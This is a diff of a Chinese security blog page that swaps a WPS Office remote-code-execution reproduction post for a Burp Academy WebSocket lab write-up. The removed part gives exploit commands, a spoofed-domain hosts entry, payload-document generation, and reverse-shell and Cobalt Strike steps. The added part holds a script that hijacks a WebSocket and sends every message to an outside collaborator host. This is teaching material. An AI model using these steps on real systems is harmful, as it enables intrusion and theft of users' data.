@@ -16,24 +16,25 @@
   <meta name="author" content="QY">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞影响WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085 漏洞复习本地复现 下载poc，需要python3.8以上的版本 1https:&#x2F;&#x2F;github.com&#x2F;ba0gu0&#x2F;wps-rce  执行以下命令安装依赖文件 12cd wps_rcepip install -r requirement.txt -i https">
+    <meta name="description" content="burp靶场WebSocket漏洞1.操纵 WebSocket 消息以利用漏洞   发送信息抓包，获取WebSocket链接，插入xss代码进行发送完成实验 2.poc 123456789&lt;script&gt;    var ws &#x3D; new WebSocket(&amp;#x27;wss:&#x2F;&#x2F;0a1c003703c889ba8172b6ea000f006d.web-security-academy">
 <meta property="og:type" content="article">
-<meta property="og:title" content="WPS-rce-0day-漏洞复现">
-<meta property="og:url" content="http://example.com/2023/08/12/WPS-rce-0day-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="burp靶场-WebSocket漏洞">
+<meta property="og:url" content="http://example.com/2023/08/17/burp%E9%9D%B6%E5%9C%BA-WebSocket%E6%BC%8F%E6%B4%9E/index.html">
 <meta property="og:site_name" content="yaya-blog">
-<meta property="og:description" content="漏洞影响WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085 漏洞复习本地复现 下载poc，需要python3.8以上的版本 1https:&#x2F;&#x2F;github.com&#x2F;ba0gu0&#x2F;wps-rce  执行以下命令安装依赖文件 12cd wps_rcepip install -r requirement.txt -i https">
+<meta property="og:description" content="burp靶场WebSocket漏洞1.操纵 WebSocket 消息以利用漏洞   发送信息抓包，获取WebSocket链接，插入xss代码进行发送完成实验 2.poc 123456789&lt;script&gt;    var ws &#x3D; new WebSocket(&amp;#x27;wss:&#x2F;&#x2F;0a1c003703c889ba8172b6ea000f006d.web-security-academy">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121010366.jpg">
-<meta property="article:published_time" content="2023-08-12T02:09:42.000Z">
-<meta property="article:modified_time" content="2023-08-13T04:18:17.755Z">
+<meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171701415.jpg">
+<meta property="article:published_time" content="2023-08-17T09:00:16.000Z">
+<meta property="article:modified_time" content="2023-08-18T00:37:38.229Z">
 <meta property="article:author" content="QY">
-<meta property="article:tag" content="-漏洞复现">
+<meta property="article:tag" content="burpsuite靶场">
+<meta property="article:tag" content="WebSocket">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121010366.jpg">
+<meta name="twitter:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171701415.jpg">
   
   
   
-  <title>WPS-rce-0day-漏洞复现 - yaya-blog</title>
+  <title>burp靶场-WebSocket漏洞 - yaya-blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="WPS-rce-0day-漏洞复现"></span>
+            <span id="subtitle" data-typed-text="burp靶场-WebSocket漏洞"></span>
           
         </div>
 
@@ -210,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-12 10:09" pubdate>
-          2023年8月12日 上午
+        <time datetime="2023-08-17 17:00" pubdate>
+          2023年8月17日 下午
         </time>
       </span>
     
@@ -222,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          533 字
+          474 字
         
       </span>
     
@@ -233,7 +234,7 @@
         
         
         
-          5 分钟
+          4 分钟
         
       </span>
     
@@ -271,58 +272,19 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">WPS-rce-0day-漏洞复现</h1>
+            <h1 style="display: none">burp靶场-WebSocket漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><p>WPS Office 2023个人版＜11.1.0.15120；WPS Office 2019企业版＜11.8.2.12085</p>
-<h3 id="漏洞复习"><a href="#漏洞复习" class="headerlink" title="漏洞复习"></a>漏洞复习</h3><p>本地复现</p>
-<p>下载poc，需要python3.8以上的版本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">https://github.com/ba0gu0/wps-rce<br></code></pre></td></tr></table></figure>
+                <h3 id=""><a href="#" class="headerlink" title=""></a></h3><h1 id="burp靶场WebSocket漏洞"><a href="#burp靶场WebSocket漏洞" class="headerlink" title="burp靶场WebSocket漏洞"></a>burp靶场WebSocket漏洞</h1><h3 id="1-操纵-WebSocket-消息以利用漏洞"><a href="#1-操纵-WebSocket-消息以利用漏洞" class="headerlink" title="1.操纵 WebSocket 消息以利用漏洞"></a>1.操纵 WebSocket 消息以利用漏洞</h3><p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171727461.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload alt="image-20230817172726435"></p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308171727308.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
 
-<p>执行以下命令安装依赖文件</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">cd wps_rce<br>pip install -r requirement<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">i</span> https:<span class="hljs-comment">//pypi.tuna.tsinghua.edu.cn/simple</span><br></code></pre></td></tr></table></figure>
-
-<p>在server文件夹下运行</p>
-<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> main.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
-
-<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121016091.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
-
-<p>访问url</p>
-<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121017483.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
-
-<p>在受害主机上添加host</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">vpsip clientweb<span class="hljs-selector-class">.docer</span><span class="hljs-selector-class">.wps</span><span class="hljs-selector-class">.cn</span><span class="hljs-selector-class">.hackerwps</span>.cn<br></code></pre></td></tr></table></figure>
+<p>发送信息抓包，获取WebSocket链接，插入xss代码进行发送完成实验</p>
+<h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><p>poc</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> ws = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocket</span>(<span class="hljs-string">&#x27;wss://0a1c003703c889ba8172b6ea000f006d.web-security-academy.net/chat&#x27;</span>);</span><br><span class="language-javascript">    ws.<span class="hljs-property">onopen</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">        ws.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;READY&quot;</span>);</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript">    ws.<span class="hljs-property">onmessage</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">event</span>) &#123;</span><br><span class="language-javascript">        <span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://g1iy6yqz871j2i3c0vze2cg83z9pxe.burpcollaborator.net&#x27;</span>, &#123;<span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;no-cors&#x27;</span>, <span class="hljs-attr">body</span>: event.<span class="hljs-property">data</span>&#125;);</span><br><span class="language-javascript">    &#125;;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
 
 
-
-<p>因此弹出计算器的payload为</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>clientweb.docer.wps.cn.hackerwps.cn/calc<br></code></pre></td></tr></table></figure>
-
-
-
-<p>进入client文件夹运行</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python <span class="hljs-selector-tag">main</span><span class="hljs-selector-class">.py</span> test<span class="hljs-selector-class">.docx</span> http:<span class="hljs-comment">//clientweb.docer.wps.cn.hackerwps.cn/calc</span><br></code></pre></td></tr></table></figure>
-
-<p>test是要注入payload的文档</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121027483.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p>生成带有命令的payload到目标主机上运行</p>
-<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121459112.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
-
-<p>成功弹出计算器</p>
-<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>生成文档</p>
-<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121501859.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
-
-<p>开启监听</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121502817.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<h4 id="上线cs"><a href="#上线cs" class="headerlink" title="上线cs"></a>上线cs</h4><p>cs启动！</p>
-<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121512430.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
-<p>开启监听</p>
-<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121515570.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
-
-<p>生成恶意文档</p>
-<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202308121518177.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
                 
               </div>
             
@@ -340,7 +302,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a>
+  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8BURP/" class="category-chain-item">网络安全BURP</a>
   
   
 
@@ -355,7 +317,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#-漏洞复现</a>
+        <a href="/tags/burpsuite%E9%9D%B6%E5%9C%BA/">#burpsuite靶场</a>
+      
+        <a href="/tags/WebSocket/">#WebSocket</a>
       
     </div>
   
@@ -367,8 +331,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>WPS-rce-0day-漏洞复现</div>
-      <div>http://example.com/2023/08/12/WPS-rce-0day-漏洞复现/</div>
+      <div>burp靶场-WebSocket漏洞</div>
+      <div>http://example.com/2023/08/17/burp靶场-WebSocket漏洞/</div>
     </div>
     <div class="license-meta">
       
@@ -380,7 +344,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月12日</div>
+          <div>2023年8月17日</div>
         </div>
       
       
@@ -412,9 +376,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/17/burp%E9%9D%B6%E5%9C%BA-WebSocket%E6%BC%8F%E6%B4%9E/" title="burp靶场-WebSocket漏洞">
+                      <a href="/2023/09/12/CSRF%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/" title="CSRF绕过总结">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">burp靶场-WebSocket漏洞</span>
+                        <span class="hidden-mobile">CSRF绕过总结</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -422,8 +386,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/11/burpsuite%E9%9D%B6%E5%9C%BAcsrf/" title="burpsuite靶场csrf">
-                        <span class="hidden-mobile">burpsuite靶场csrf</span>
+                      <a href="/2023/08/12/WPS-rce-0day-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="WPS-rce-0day-漏洞复现">
+                        <span class="hidden-mobile">WPS-rce-0day-漏洞复现</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
